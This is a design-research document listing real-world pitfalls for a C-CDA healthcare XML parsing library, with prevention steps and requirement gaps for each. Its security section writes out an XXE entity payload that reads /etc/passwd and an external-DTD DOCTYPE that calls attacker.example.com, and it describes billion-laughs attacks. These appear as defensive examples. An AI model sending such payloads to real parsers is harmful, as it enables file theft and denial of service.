# C-CDA Pitfalls — Domain Research

**Project:** `@cosyte/ccda`
**Researched:** 2026-04-22
**Mode:** Pitfalls dimension (project research)
**Overall confidence:** MEDIUM–HIGH on XML/spec/security pitfalls (Context7-equivalent and official-source backed); MEDIUM on vendor-specific quirks (sourced from HL7 Companion Guide, Carequality/CommonWell joint guidance, sample-CCDA repos, and groups.google HL7 listserv threads — but vendor companion guides themselves are gated and could not be fetched directly).

This file is the "what blows up on first contact with real EHR data" reference for `@cosyte/ccda`. Each pitfall lists:

- **What goes wrong** — the symptom on real input
- **Why it happens** — root cause in CDA / RIM / vendor practice
- **Warning signs** — how to detect early during library development
- **Prevention** — what the library does (warning code, lenient default, contract clarification)
- **Phase** — which ROADMAP.md phase addresses it
- **REQ coverage** — covered (cite REQ-ID) OR gap (state the gap)

The roadmap phases referenced are:

1. Project Foundation & XML Parser ADR
2. Core XML Parser & Tolerance
3. Document Header, Typed Model & Data Types
4. Templates, Sections & Coded Values
5. Named Helpers & Narrative Reconciliation
6. Serialization & Round-Trip
7. Profile System & Built-ins
8. Testing, Examples, Starter Kit & Documentation

Gaps surfaced in this research are summarized at the bottom under **REQUIREMENTS.md Gap Analysis**.

---

## A. XML Pitfalls Specific to C-CDA

### A1. Hard-coded namespace prefix breaks default-namespace documents

**What goes wrong:** A parser that reaches for `cda:ClinicalDocument` returns nothing on a document declared as `<ClinicalDocument xmlns="urn:hl7-org:v3">` (no prefix), and the inverse: a parser that reaches for `ClinicalDocument` (no prefix) returns nothing on a document that declares `xmlns:cda="urn:hl7-org:v3"` and uses `<cda:ClinicalDocument>`. Both forms are valid XML and both appear in production traffic.

**Why it happens:** XML namespace binding is independent of the prefix string. The `xmlns:cda="urn:hl7-org:v3"` declaration binds `cda` locally; another document binds the same namespace as the default. Naive XPath-style access by string concatenation ignores the binding model entirely.

**Warning signs:** Helpers return `undefined` on documents that visually look identical to working fixtures except for prefix usage; round-trip tests pass but real-vendor fixtures silently fail.

**Prevention:**
- Never key parsing off prefix strings. Resolve nodes by `(namespaceURI, localName)` tuple at the XML adapter boundary, regardless of how the source declared the binding.
- Emit `CCDA_NAMESPACE_PREFIX_VARIATION` (Tier 2 warning, defined in REQ TOL-03) when the document uses anything other than the default namespace for `urn:hl7-org:v3` or anything other than `sdtc` for `urn:hl7-org:sdtc`. The warning is informational — it does not affect parsing — but the developer can use it to track downstream serializer expectations.
- The XML-parser-adapter ADR (REQ DOC-16d, Phase 1) must explicitly require namespace-aware parsing. `fast-xml-parser` users must enable `removeNSPrefix: false` and resolve via the namespace map; `sax` users must consume `opennsTag`/`namespace` events; `@xmldom/xmldom` is namespace-aware by default.

**Phase:** 1 (ADR), 2 (parser).
**REQ coverage:** PARSE-02, TOL-03 (`CCDA_NAMESPACE_PREFIX_VARIATION` is in the warning list).

---

### A2. Mixed-content narrative loses interleaved text nodes

**What goes wrong:** `<paragraph>Patient takes <content ID="med1">aspirin</content> daily.</paragraph>` parses to `{ content: { ID: 'med1', '#text': 'aspirin' } }` and the literal `Patient takes ` and ` daily.` text-node siblings vanish. Result: narrative reconstruction loses everything between inline elements.

**Why it happens:** Many JS-to-JSON XML parsers (notably `fast-xml-parser` in default mode, `xml2js`, `xml-js`) collapse element children into a key-keyed object, losing both ordering and free-floating text. CDA narrative is mixed content by design (`<text>`, `<paragraph>`, `<content>`, `<linkHtml>`, `<br/>`, `<table>`, `<list>` interleaved with raw text).

**Warning signs:** Narrative round-trip tests fail even on canonical IG fixtures; the serialized `<text>` block is shorter than the source.

**Prevention:**
- The XML-parser ADR (Phase 1) must use *node-list* representation for `<text>` and its descendants — not key-keyed object representation. Options:
  - `@xmldom/xmldom` (DOM model — preserves order natively).
  - `fast-xml-parser` with `preserveOrder: true` and `parseTagValue: false` (returns an ordered array of single-key objects per child).
  - `sax` (event stream — order is intrinsic).
  - `parse-xml` (returns a DOM-like tree with ordered `children`).
- The narrative content tree (REQ NARR-01) is a typed structure that preserves order and text nodes verbatim. The serializer (REQ NARR-04, SER-01) emits it byte-for-byte.
- Test fixture: a `<text>` block with text-element-text-element-text interleaving is a Phase-2 acceptance fixture (extends REQ TEST-03 mixed-content fixture).

**Phase:** 1 (ADR), 2 (parser), 5 (narrative tree), 6 (serializer fidelity).
**REQ coverage:** PARSE-04, NARR-01, NARR-04. **The XML-parser ADR must explicitly disqualify any candidate that cannot preserve mixed content with order — currently REQ DOC-16d says "the bar it cleared" but does not name mixed-content preservation as an explicit gate.** Recommend amending DOC-16d.

---

### A3. Missing or non-standard `xsi:type` on `<value>` causes silent typing collapse

**What goes wrong:** The C-CDA Vital Sign Observation requires `<value xsi:type="PQ" value="120" unit="mm[Hg]"/>`. Real-world variants:

- `xsi:type` missing entirely → parser cannot discriminate; falls back to "unknown" or to string.
- `xsi:type="hl7:PQ"` or `xsi:type="cda:PQ"` — the prefix on the `xsi:type` *value* is bound to the HL7 namespace, but parsers that match on the literal string `"PQ"` fail.
- Empty default-namespace document where `xsi:type="PQ"` resolves to the document's default namespace (`urn:hl7-org:v3`), which is the correct binding — but parsers that ignore the binding and match on literal string still work for the wrong reasons (and break later when an `xsi:type` value is qualified).

**Why it happens:** `xsi:type` is a QName whose value is namespace-qualified. The HL7 ITS rule is that the prefix part of the QName resolves through the surrounding namespace declarations. Many parsers treat the attribute value as an opaque string.

**Warning signs:** PQ values parse as strings on real fixtures; result-organizer entries with `xsi:type="ST"` (text result) get treated as PQ and produce `value: NaN`; TS values get treated as plain strings and skip date parsing.

**Prevention:**
- Resolve `xsi:type` as a QName (split on `:`, look up the prefix in the in-scope namespace map, compare the local name against known data-type symbols).
- When `xsi:type` is missing on an element where the spec requires it (Observation/value, etc.), emit `CCDA_MISSING_XSI_TYPE` (**new warning code** — not in current TOL-03 list).
- When `xsi:type` resolves to a prefix not bound to `urn:hl7-org:v3`, emit `CCDA_XSI_TYPE_NAMESPACE_DEVIATION` (**new code**).
- Lenient default: when `xsi:type` is missing on an Observation/value, infer type by structure (`<value>` with `@value` and `@unit` → PQ; with `@code`+`@codeSystem` → CD; etc.) and emit a warning.

**Phase:** 2 (xsi:type resolution), 3 (typed CD/PQ/IVL_TS values), 4 (template-level value-type expectations).
**REQ coverage:** TYPES-01 covers the typed shapes. **Gap:** the warning codes `CCDA_MISSING_XSI_TYPE` and `CCDA_XSI_TYPE_NAMESPACE_DEVIATION` are not in the TOL-03 list. Recommend adding both.

---

### A4. Whitespace normalization corrupts narrative; preservation corrupts entries

**What goes wrong:** Treating all whitespace identically breaks one of two cases:

- **Normalize globally:** narrative `<paragraph>  Two spaces  </paragraph>` collapses to single spaces → human-rendered output changes; `<pre>`-equivalent blocks lose formatting.
- **Preserve globally:** entries pick up indentation as data — `<value xsi:type="ST">  
  Hello  
</value>` returns `"\n  Hello  \n"` instead of `"Hello"`; date strings parse with leading spaces and fail.

**Why it happens:** `<text>` and its descendants are mixed content with significant whitespace; structured entry values are element-only content with insignificant whitespace.

**Warning signs:** Rounded-trip narrative renders subtly differently in a stylesheet preview; date or numeric entry values fail to parse on otherwise-valid input.

**Prevention:**
- Preserve whitespace verbatim under `<text>` (and its full subtree), including text-node-only siblings and indentation.
- Trim text content for entry values where the spec semantically requires a single token (numeric `@value`, date strings, `@code`, etc.).
- Never apply XML-default whitespace stripping to the narrative tree.
- Document the rule in the README "Real-World Tolerance" section (REQ DOC-08d).

**Phase:** 2 (whitespace policy at parse time), 5 (narrative tree contract), 6 (serializer round-trip).
**REQ coverage:** PARSE-04, NARR-01, NARR-04, SER-01 cover the contract. **Gap:** the explicit whitespace-policy rule ("preserve under `<text>`, trim in element values") should be called out in PARSE-04 or in a new sub-bullet — currently it's implicit.

---

### A5. XXE / Billion Laughs / DTD attacks via XML parser (CRITICAL — security)

**What goes wrong:** A C-CDA document with a malicious DOCTYPE causes one of:

- **XXE (XML External Entity):** `<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` followed by `&xxe;` reads files off the parser host. In healthcare, this means attackers exfiltrate config, secrets, or other patient documents from disk.
- **Billion Laughs / quadratic blowup:** nested entity definitions expand a 1KB document into multi-GB memory consumption, hanging the Node process.
- **Single-large-entity attack (CVE-2026-26278 in `fast-xml-parser` 4.1.3–5.3.5):** a single big entity referenced many times bypasses the existing recursive-reference check and still consumes seconds-to-minutes of CPU per parse.
- **`maxEntityCount: 0` bypass (CVE-2026-33349 in `fast-xml-parser`):** the truthy check evaluates `0` as falsy, silently disabling the limit the developer intended to set.
- **External-DTD fetch:** `<!DOCTYPE ClinicalDocument SYSTEM "http://attacker.example.com/foo.dtd">` triggers an outbound request from the parser host (SSRF + parser fingerprint leak).

**Why it happens:** XML parsers historically treated DTD processing as a benign default. `urn:hl7-org:v3` does not require DTDs at all — they have no legitimate place in C-CDA. Yet most parsers will dutifully process them when present.

**Warning signs:** None at parse time unless explicitly tested. CI must include a malicious-DOCTYPE fixture.

**Prevention (this is the highest-priority security item in the library):**
- The XML-parser-adapter ADR (REQ DOC-16d, Phase 1) must require **DTDs disabled by default** at the parser layer. Specifically:
  - `fast-xml-parser`: pass `processEntities: false` (or use the `XMLValidator` to reject any DOCTYPE before parsing). Also pin `>= 5.3.6` to avoid CVE-2026-26278 and CVE-2026-33349; never expose `maxEntityCount`/`maxEntitySize` as a passthrough where `0` could be set.
  - `@xmldom/xmldom`: known historical XXE issues (CVE-2021-21366); current versions are safer but the adapter must still strip DOCTYPE before handing to the parser.
  - `sax`: does not expand external entities by default, but the adapter should still reject DOCTYPE.
  - `libxmljs2`: backed by libxml2; must pass `noent: false, nonet: true, dtdload: false, dtdvalid: false`.
- Reject any document with a DOCTYPE in default lenient mode → throw `CCDAParseError` with code `DTD_DECLARATION_PRESENT` (**new fatal code** — not in TOL-02 list of `NOT_XML`/`NO_CLINICAL_DOCUMENT_ROOT`/`INVALID_NAMESPACE`/`EMPTY_INPUT`).
- Provide an explicit opt-in `{ allowDTD: true }` for the rare archival document with a `<?xml-stylesheet?>` paired with a DOCTYPE — but even then, never resolve external entities or fetch external DTDs.
- Add a `SECURITY.md` to the repo that documents the threat model, the disabled-by-default posture, the version pin for the chosen XML parser, and the disclosure address.
- A red-team fixture set in `test/fixtures/security/` exercises XXE, billion-laughs (classic and single-large-entity), external-DTD-fetch, and `xsi:schemaLocation` poisoning. CI fails if any of these parse without a fatal error.

**Phase:** 1 (ADR + version pin), 2 (DTD rejection + warning code), 8 (security fixtures + SECURITY.md).
**REQ coverage:** **GAP — significant.** Current REQUIREMENTS.md has no security-specific REQ-IDs. Specifically:
- No requirement that DTDs be disabled by default.
- No `DTD_DECLARATION_PRESENT` fatal code in TOL-02.
- No `SECURITY.md` requirement in DOC-d series.
- No security-fixture requirement in TEST series (TEST-04 covers malformed XML but not malicious XML).
**Recommended new REQs:**
- **PARSE-09 (new):** DTDs are disabled by default; documents containing a DOCTYPE throw `CCDAParseError` with code `DTD_DECLARATION_PRESENT` unless `{ allowDTD: true }` is passed (and even then external entities are never resolved and external DTDs are never fetched).
- **TOL-02 amendment:** add `DTD_DECLARATION_PRESENT` to the fatal-code list.
- **TEST-10 (new):** `test/fixtures/security/` contains XXE, billion-laughs (classic + single-large-entity), external-DTD-fetch, and `xsi:schemaLocation` fixtures; each must produce a fatal error.
- **DOC-17d (new):** `SECURITY.md` exists at repo root, documenting the threat model, parser version pin, and disclosure address.

---

### A6. Processing-instruction loss breaks downstream stylesheet rendering

**What goes wrong:** `<?xml-stylesheet type="text/xsl" href="CDA.xsl"?>` is the line that lets browsers and EHR document viewers render a CDA as a human-readable page. A serializer that drops processing instructions silently removes the document's only built-in viewer.

**Why it happens:** PIs are not part of the element tree in many JSON-style XML libraries — they are out-of-band events that get discarded.

**Warning signs:** Round-trip tests pass on structured content but the serialized document opens as raw XML in a browser instead of rendering.

**Prevention:** REQ PARSE-03 already requires PI preservation; the parser must capture every PI in document order (especially the `<?xml-stylesheet?>` family) and the serializer must emit them at the original position. Adapter implementations that don't surface PIs (some `fast-xml-parser` configurations) must be configured to expose them or rejected in the ADR.

**Phase:** 1 (ADR), 2 (parser), 6 (serializer).
**REQ coverage:** PARSE-03, SER-01 (covered).

---

## B. C-CDA Structural Traps

### B1. Narrative-only sections — the single most common production miss

**What goes wrong:** Sections like "Reason for Referral," "Hospital Course," "Assessment," and (in many vendor outputs) "History of Present Illness" routinely contain a `<text>` block with all the clinically relevant content and *zero* `<entry>` elements. An app that walks `section.entries[]` to extract data sees nothing and concludes the section is empty — the actual content sits in narrative.

**Why it happens:** The C-CDA IG allows narrative-only sections by design. Some sections (Hospital Course, 2.16.840.1.113883.10.20.22.2.62; Reason for Referral, 2.16.840.1.113883.10.20.22.2.42) have no entry templates defined at all — they're narrative-only by spec. Other sections allow narrative-only as a fallback when the source EHR has unstructured data. EHRs frequently take that fallback for free-text chart sections.

**Warning signs:** Helpers return empty arrays for sections that are visibly populated when the document is rendered through its stylesheet; vendor fixtures lose ~30–60% of document content if the consumer treats `entries[]` as the source of truth.

**Prevention:**
- Emit `CCDA_NARRATIVE_ONLY_SECTION` (in TOL-03 already) when a section has `<text>` non-empty but `entries[]` is empty.
- `section.text` exposes the structured narrative tree (REQ NARR-01) so the consumer can render or extract from narrative directly.
- Provide a `section.hasStructuredEntries` boolean on the Section wrapper (cheap convenience flag, not in current model).
- Document the "narrative-only is normal" pattern prominently in the README "Real-World Tolerance" section (REQ DOC-08d) and in the Cookbook recipe for "iterate sections" (REQ DOC-06d).

**Phase:** 5 (narrative tree + warning emit), 8 (docs).
**REQ coverage:** NARR-01, NARR-04, TOL-03 (`CCDA_NARRATIVE_ONLY_SECTION`). **Gap (minor):** `section.hasStructuredEntries` convenience flag is not in MODEL-03; recommend adding.

---

### B2. Entry-only / minimal-narrative sections — Cerner pattern

**What goes wrong:** Some EHR outputs minimize the narrative `<text>` block to a placeholder ("See structured data") while putting the real content in entries. An app that renders only narrative sees the placeholder; the data is in `<entry>`.

**Why it happens:** Sending systems that treat narrative as redundant with entries (and want to keep document size down) emit minimal narrative. This is technically non-conformant under strict reading of the IG (every entry must be linked to narrative content via `text/reference[@value]/#id`), but it is widespread in production. Cerner / Oracle Health is commonly cited for this pattern in HL7 listserv discussions.

**Warning signs:** Round-trip tests pass on entries but stylesheet-rendered output is mostly empty; `section.reconcile()` returns `unmatchedEntries` for most entries.

**Prevention:**
- The reconciler (REQ NARR-02) surfaces `unmatchedEntries` so the consumer can detect the pattern.
- Emit `CCDA_UNRESOLVED_IDREF` (in TOL-03 already) when an entry's `text/reference[@value]` does not resolve.
- Emit `CCDA_NARRATIVE_PLACEHOLDER` (**new code**, optional) when a section's narrative is shorter than some threshold but has populated entries — informational hint that narrative was minimized.
- Built-in `profiles.cerner` (REQ BIP-02) downgrades the unresolved-IDREF warning when the configured threshold is met (or chooses to suppress it, with the rationale documented in the profile description).

**Phase:** 5 (reconciler + warnings), 7 (profile behavior).
**REQ coverage:** NARR-02, TOL-03 (`CCDA_UNRESOLVED_IDREF`), BIP-02. **Gap (minor):** the optional `CCDA_NARRATIVE_PLACEHOLDER` informational warning is not in TOL-03; the cerner-profile behavior is only generic in BIP-02 ("reduces warnings on a realistic vendor-shape fixture"). Recommend either adding the warning or naming the specific behavior in the BIP-02 fixture set.

---

### B3. Multiple `templateId` elements — root + extension is the R2.1 pattern; legacy stacking is also seen

**What goes wrong:** An app reads only the first `<templateId>` and misclassifies the document. Per the C-CDA R2.1 IG, conforming R2.1 templates that originated in R1.1 carry **both** the R1.1 templateId (root only) **and** the R2.1 templateId (root + `extension="2015-08-01"`). An app that returns "the templateId" gets one or the other arbitrarily.

**Why it happens:** The IG explicitly mandates dual templateId declaration for backwards compatibility. Sending systems may also stack additional templateIds (R2.0 with `extension="2014-06-09"`, vendor-specific extensions, USCDI templates, QRDA overlays). The HL7 Companion Guide warns against duplicate/irrelevant declarations but the practice persists in production.

**Warning signs:** `doc.type` returns `'unknown'` on documents that are visibly CCDs because the parser matched on the wrong templateId; section template lookups miss because the matcher checked only one templateId per section.

**Prevention:**
- `doc.templateIds` returns the **full array** in document order (REQ DOC-02h, already correct).
- Document-type detection (REQ DOC-01h) iterates the full array and matches the most-specific templateId (root + extension wins over root alone).
- Section/entry template lookup (REQ TPL-05) likewise iterates the full array.
- Version detection logic:
  - Extension `2015-08-01` (or later) on the document templateId → R2.1.
  - Extension `2014-06-09` → R2.0.
  - Root-only matching the R1.1 root → R1.1.
  - **Mixed signals (e.g., R2.1 doc-level templateId paired with section templateIds that have only R1.1 roots, or an R2.1 extension on a section that doesn't exist in R2.1):** emit `CCDA_VERSION_INCONSISTENT` (**new code** — not in TOL-03).

**Phase:** 3 (header + doc-type detection), 4 (template registry).
**REQ coverage:** DOC-01h, DOC-02h, TPL-05, TOL-03 (`CCDA_MISSING_TEMPLATE_ID`, `CCDA_UNKNOWN_TEMPLATE_ID`). **Gap:** `CCDA_VERSION_INCONSISTENT` (mixed-version signals across the document) is not in TOL-03. Recommend adding.

---

### B4. `nullFlavor` collapsed to `undefined` — loses clinical meaning

**What goes wrong:** `<value nullFlavor="UNK"/>` and `<value nullFlavor="NA"/>` and a missing `<value/>` element entirely all get collapsed to `value === undefined` by the consumer. But the three convey **different clinical facts**:

- Element absent → "we don't know whether this was recorded."
- `nullFlavor="UNK"` → "we know it was assessed; the value is unknown."
- `nullFlavor="NA"` → "this concept does not apply to this patient."
- `nullFlavor="ASKU"` → "we asked the patient; they didn't or couldn't answer."
- `nullFlavor="NI"` (No Information), `nullFlavor="NAV"` (Not Available), `nullFlavor="NASK"` (Not Asked), `nullFlavor="MSK"` (Masked) — each carries distinct meaning.

For example: in an Allergy Concern Act, a substance with `nullFlavor="NI"` means "we don't know the patient's allergies" — clinically critical to surface as an alert in any safety system; *not* the same as the patient having no allergies. Confusing the two has caused real adverse-event analyses.

**Why it happens:** TypeScript optional fields and `?.` chaining naturally collapse missing values to `undefined`. Without an explicit "this was nulled-on-purpose" representation, the distinction is lost.

**Warning signs:** Allergy / problem helpers report empty arrays where the source explicitly said "no information" — and a downstream alerting system fails to alert.

**Prevention:**
- Every typed value field carries a parallel `nullFlavor` property when present. E.g., `CodedValue` has `code, codeSystem, ..., nullFlavor?: 'UNK' | 'NA' | 'NI' | 'NAV' | 'NASK' | 'ASKU' | 'OTH' | 'MSK' | 'PINF' | 'NINF' | 'INV' | 'TRC' | 'DER' | 'QS'`.
- A typed `NullFlavor` enum is exported.
- Helpers expose explicit "no-information" entries differently from absent entries. E.g., `doc.allergies` returns either `[]` (no allergies section) or `[{ noKnownAllergies: true, source: 'nullFlavor' | 'sectionAssertion' }]` (explicit no-known-allergies entry, whether the EHR used `nullFlavor` or the IHE No Known Allergies template).
- Emit `CCDA_NULLFLAVOR_IN_REQUIRED_FIELD` (already in TOL-03) when a required field is null-flavored.
- Document the distinction prominently in TYPES-02 IntelliSense and in the Cookbook recipe for allergies.

**Phase:** 3 (typed values + enum), 5 (helpers).
**REQ coverage:** TYPES-02 (CodedValue exposes core fields), TOL-03 (`CCDA_NULLFLAVOR_IN_REQUIRED_FIELD`). **Gap (significant):** TYPES-02 does not currently mention a `nullFlavor` field on `CodedValue`, and the typed `NullFlavor` enum is not in TYPES-01. The "no-known-allergies" / "no-known-problems" / "no-known-medications" conventions are not called out in HELPERS-01..03. Recommend amending TYPES-01 and -02 and adding a sub-bullet to HELPERS-01..03 stating: "Explicit 'no known X' assertions (whether via `nullFlavor` or via the IHE No Known Allergies / No Known Problems / No Known Medications entry templates) surface as a single-element array with a flagged property — never as `[]`."

---

### B5. `originalText` reference-only — `displayName` empty

**What goes wrong:** `<value xsi:type="CD" code="73211009" codeSystem="2.16.840.1.113883.6.96"><originalText><reference value="#problem1"/></originalText></value>` — the human-readable text lives in narrative `<content ID="problem1">Diabetes mellitus type 2</content>`. An app that reads `value.displayName` gets `undefined` (because the spec allows omitting `displayName` when `originalText` provides the human-readable form). An app that reads `value.originalText` as a string gets `"#problem1"`.

**Why it happens:** Narrative-text-as-source-of-truth is a CDA design pattern. The structured code points to the narrative for the human label.

**Warning signs:** Problem and result helpers return entries whose `name` field is an internal IDREF (`"#problem1"`) instead of human text.

**Prevention:**
- `CodedValue.originalText` resolves the IDREF to the narrative text content when a `<reference>` is present (REQ NARR-02 reconciliation hooks into this).
- `CodedValue.displayName` falls back to the resolved `originalText` when `displayName` is absent.
- Helpers' `name` field uses `displayName ?? originalText ?? code` precedence.
- Emit `CCDA_DISPLAYNAME_MISSING_USED_NARRATIVE` (**new code**) when this fallback fires — the developer can use it to track narrative-dependent fields.

**Phase:** 4 (CodedValue + originalText resolution), 5 (helper precedence + narrative resolver).
**REQ coverage:** TYPES-02 (`originalText` field), NARR-02 (reconciler). **Gap:** the IDREF-resolution behavior of `originalText` is not explicit in TYPES-02 — recommend amending. The `CCDA_DISPLAYNAME_MISSING_USED_NARRATIVE` warning code is not in TOL-03 — optional, recommend adding.

---

### B6. Half-bounded `IVL_TS` intervals — no `<high>`, no `<low>`, or `nullFlavor` on a bound

**What goes wrong:** Active medications routinely have `<low value="20240115"/>` and **no** `<high>`. An app that requires both bounds to construct a "from–to" interval throws or renders an empty range.

Variants:
- `<low value="20240115"/>` only — "started on date, still active."
- `<high value="20240301"/>` only — "ended on date, no recorded start."
- `<low value="20240115"/><high nullFlavor="UNK"/>` — "started on date, end unknown."
- `<low nullFlavor="NA"/><high value="20240301"/>` — typically "PRN as needed; ended on date."
- `<value nullFlavor="UNK"/>` (the whole interval null-flavored).

**Why it happens:** RIM IVL_TS allows half-bounded and unbounded intervals; the clinical semantics depend entirely on context.

**Warning signs:** Medication helpers throw on active meds; encounter helpers throw on open admissions.

**Prevention:**
- `IVL_TS` (REQ TYPES-01) exposes `low?: TS, high?: TS, lowNullFlavor?: NullFlavor, highNullFlavor?: NullFlavor` — every combination is representable; nothing throws on partial bounds.
- Helpers handling active-vs-historical (medications.current vs all, problems.active vs resolved) treat `high` absent or `highNullFlavor` set to `UNK`/`NA`/`NI` as "still active" — decision rule documented in HELPERS-02.
- Test fixture for each of the four variants (extends TEST-03 list).

**Phase:** 3 (IVL_TS type), 5 (helper active/inactive logic).
**REQ coverage:** TYPES-01 (IVL_TS shape). **Gap:** TYPES-01 doesn't enumerate `lowNullFlavor`/`highNullFlavor` on IVL_TS — recommend amending. The active-vs-historical decision rule is not explicit in HELPERS-01/02 — recommend adding.

---

### B7. `<translation>` ignored — billing/diagnosis codes lost

**What goes wrong:** A problem coded primarily as SNOMED `<code code="44054006" codeSystem="2.16.840.1.113883.6.96" displayName="Diabetes mellitus type 2"><translation code="E11.9" codeSystem="2.16.840.1.113883.6.90" displayName="Type 2 diabetes mellitus without complications"/></code>` carries the ICD-10 mapping in `<translation>`. An app that reads only the primary code loses the billing-relevant ICD-10 — common consumer requirement.

**Why it happens:** CDA represents code-system equivalence via the `translation` mechanism. Real-world EHRs use it to provide both the clinically-rich SNOMED and the billing-required ICD-10/CPT.

**Warning signs:** Billing-pipeline consumers report missing diagnosis codes; SNOMED-to-ICD reconciliation has to happen externally.

**Prevention:** REQ TYPES-02 already requires `translations[]` on `CodedValue`; helpers must surface translations alongside the primary code, and the README Cookbook (REQ DOC-06d) must include a "find the ICD-10 from a SNOMED-coded problem" recipe.

**Phase:** 4 (CodedValue.translations), 5 (helpers expose), 8 (docs).
**REQ coverage:** TYPES-02 (covered). **Gap (minor):** the README Cookbook list (DOC-06d) doesn't currently include a translations-resolution recipe; recommend adding.

---

### B8. `II` instance identifier semantics — picking the wrong identifier as MRN

**What goes wrong:** `<patientRole>` carries multiple `<id>` (II) elements: an MRN (root = facility OID, extension = MRN string), a SSN (root = `2.16.840.1.113883.4.1`), an external MPI (Master Patient Index) ID, perhaps a UUID-only identifier. An app that does `patient.id[0].extension` returns whichever identifier the EHR happened to put first — sometimes the MRN, sometimes the MPI, sometimes the SSN.

Variants of `II`:
- `root` is OID + `extension` = MRN string (the standard form).
- `root` is a UUID, no extension (common for technical/internal IDs).
- `root` is OID + no extension (rare; OID alone identifies the thing).
- `nullFlavor="NA"` (no usable identifier — should not be used in patient role).

**Why it happens:** RIM II is a polymorphic identifier type used for everything from patients to documents to organizations. There's no standard ordering of the patient's IDs.

**Warning signs:** `doc.patient.mrn` returns the SSN on documents from a vendor that puts SSN first.

**Prevention:**
- `doc.patient.mrn` walks `<id>` looking for a recognized MRN OID (built-in registry of common facility/payer OIDs + profile-extensible).
- If no recognized MRN OID matches: `doc.patient.mrn` returns `undefined` and emits `CCDA_MRN_OID_NOT_RECOGNIZED` (**new code**) listing the OIDs encountered.
- `doc.patient.identifiers[]` always exposes the full list in source order with the resolved `system: 'mrn' | 'ssn' | 'mpi' | 'uuid' | 'unknown'` discriminator.
- The `defineProfile` API (REQ PROF-07) lets vendor profiles register their facility's MRN OIDs.

**Phase:** 3 (patient + II), 4 (OID registry hook), 7 (profile-extensible MRN OID list).
**REQ coverage:** TYPES-06 (II distinguishes OID/UUID/extension forms), DOC-04h (`doc.patient.mrn` and `identifiers[]`). **Gap:** `CCDA_MRN_OID_NOT_RECOGNIZED` is not in TOL-03 — recommend adding. The MRN-OID registry mechanism is implicit in TYPES-06 ("`mrn`-pickers prefer a recognized MRN OID registry") but the registry itself is not specified in CODE-01. Recommend either listing common facility-OID assignments or making the registry explicitly profile-only with a documented contract.

---

### B9. Section ordering — CCD vs Discharge Summary expectations differ

**What goes wrong:** An app that processes sections in a hardcoded "expected for a CCD" order works on CCDs but breaks on Discharge Summaries (different required sections in different positions) and Progress Notes (mostly narrative-only; structured sections rare).

**Why it happens:** Each of the 12 C-CDA document types has its own required-section list; the IG enforces ordering only loosely (recommended, not strict).

**Warning signs:** Document-type-specific helpers fail on documents of a different type.

**Prevention:**
- All access is template-id-keyed (REQ MODEL-02), never positional.
- `doc.section(templateId | loincCode)` works regardless of where in the document the section sits.
- Document-type-specific helpers (`doc.dischargeSummary?.dischargeMedications`, etc.) are out of scope for v1 (deferred per "Typed document-type overlays" in v2 list) — v1 helpers are document-type-agnostic.

**Phase:** 3 (section access), 5 (helpers).
**REQ coverage:** MODEL-02 (covered).

---

## C. Vendor Real-World Quirks

**Confidence note:** Specific vendor quirks below are sourced from HL7 listserv discussions (groups.google.com/g/edge-test-tool, groups.google.com/g/transport-testing-tool, groups.google.com/g/ccda_samples), the open-source `chb/sample_ccdas` GitHub repository, and the Carequality/CommonWell joint guidance documents. Vendor companion guides themselves (Epic, Cerner/Oracle Health, Meditech, athenahealth) are typically gated behind partner agreements and could not be fetched directly. Treat the vendor-attribution of any single quirk as MEDIUM confidence; the existence of the *pattern* in production data is HIGH confidence regardless of which vendor emits it most often.

### C1. Epic

**Quirk 1 — `sdtc:` extension elements in patient role:** Epic uses `<sdtc:raceCode>` for additional race detail, `<sdtc:ethnicGroupCode>` for additional ethnicity, and `<sdtc:patient>` extensions for fields not in the base `<patient>` (e.g., birth-sex). The library must resolve `sdtc` namespace bindings (`urn:hl7-org:sdtc`) — REQ PARSE-02 covers this. **Detection:** `<sdtc:raceCode>` present → multi-race patient; expose as a typed `additionalRaceCodes[]` field on `doc.patient`.

**Quirk 2 — Templated entries that "go beyond" the IG:** Epic emits some entries with extra child elements (Z-templates, custom observations) that strict validators flag as "unexpected element." The library must skip-and-warn on unrecognized children rather than throw: emit `CCDA_UNRECOGNIZED_ELEMENT` (**new code**, optional but useful).

**Quirk 3 — Multiple linked CCDs:** Epic Care Everywhere can return multiple CCDs in a single response wrapped in a transport envelope; consumers occasionally pass the envelope text to a parser that only handles a single document. The library should detect "multiple `<ClinicalDocument>` roots in the input" and throw `MULTIPLE_CLINICAL_DOCUMENTS` (**new fatal code**) directing the consumer to split first. (Source: open.epic.com/Clinical/EHRtoEHR notes that Care Everywhere returns CCDs; the multi-document envelope pattern is observable in `chb/sample_ccdas` fixtures.)

**Phase:** 2 (multi-document detect), 3 (sdtc on patient), 7 (profiles.epic).
**REQ coverage:** PARSE-02 (sdtc namespace), BIP-01 (epic profile). **Gaps:**
- `additionalRaceCodes[]` not in DOC-04h.
- `CCDA_UNRECOGNIZED_ELEMENT` and `MULTIPLE_CLINICAL_DOCUMENTS` not in warning/fatal lists.

### C2. Cerner / Oracle Health

**Quirk 1 — Minimal narrative on structured sections:** Cerner outputs sometimes produce sparse narrative for sections with rich entries (entry-only pattern in B2 above). `profiles.cerner` should ship with a fixture demonstrating narrative-as-placeholder + populated entries, and either suppress or downgrade `CCDA_UNRESOLVED_IDREF` for that specific shape.

**Quirk 2 — Code-system OID variants:** Cerner has historically emitted occasional non-standard or vendor-namespace OIDs for value sets (e.g., a Cerner-internal OID for an observation code system that's intended to be SNOMED). `profiles.cerner` registers known mappings via `oidRegistry`.

**Quirk 3 — Document-level templateId without extension:** Some older Cerner CCDs declare R2.1-shaped content but ship only the R1.1 root templateId on the document (no extension). The library should detect "structure looks like R2.1, templateId says R1.1" via the version-inconsistent warning (`CCDA_VERSION_INCONSISTENT` from B3 above).

**Phase:** 2 (warnings), 5 (reconciler), 7 (profiles.cerner).
**REQ coverage:** BIP-02 (cerner profile, but generic). **Gap:** the specific Cerner behaviors above are not enumerated in BIP-02 — recommend tightening BIP-02 to "ships with at least one fixture demonstrating Cerner's known patterns: (a) entry-rich / narrative-placeholder sections, (b) Cerner-internal code-system OIDs."

### C3. Meditech

**Quirk 1 — Non-standard date precision:** Meditech outputs sometimes use date-only precision (`YYYYMMDD`) where the IG suggests datetime; sometimes uses `YYYY` only on imprecise birth dates. Already handled by REQ TYPES-03 (truncations) + TYPES-04 (unparseable returns undefined) + TOL-03 (`CCDA_TIMESTAMP_FALLBACK_FORMAT`).

